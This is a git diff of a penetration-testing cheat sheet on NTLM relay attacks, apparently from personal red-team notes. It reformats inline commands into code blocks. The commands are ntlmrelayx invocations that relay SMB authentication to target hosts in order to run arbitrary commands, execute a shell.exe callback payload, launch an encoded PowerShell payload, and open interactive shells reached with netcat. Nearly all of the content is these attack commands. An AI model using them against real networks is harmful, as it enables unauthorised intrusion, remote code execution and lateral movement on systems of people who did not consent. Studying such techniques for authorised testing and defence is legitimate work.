@@ -6,19 +6,23 @@
 
 TODO: Fill more info
 
-`$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -c <commands>`
+```
+$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -c <commands>
 
-`$ sudo ntlmrelayx -tf targets.txt -smb2support -c <commands>`
+$ sudo ntlmrelayx -tf targets.txt -smb2support -c <commands>
 
-`$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe`
+$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe
 
-`$ sudo ntlmrelayx -tf targets.txt -smb2support -e shell.exe`
+$ sudo ntlmrelayx -tf targets.txt -smb2support -e shell.exe
+```
 
 - Interactive shell with netcat
 
-`$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -socks`
+```
+$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -socks
 
-`$ nc 127.0.0.1 <PORT>`
+$ nc 127.0.0.1 <PORT>
+```
 
 ### 1.3 - Use Cases
 
@@ -41,15 +45,19 @@ HTTP=OFF
 
 Spawn callback shell
 
-`$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe`
+```
+$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe
 
-`$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -c "powershell.exe -E <base64_encoded>"`
+$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -c "powershell.exe -E <base64_encoded>"
+```
 
 Interactive shell with netcat
 
-`$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -i`
+```
+$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -i
 
-`$ nc 127.0.0.1 <PORT>`
+$ nc 127.0.0.1 <PORT>
+```
 
 #### 1.3.2 - Proxychains via Relaying
 
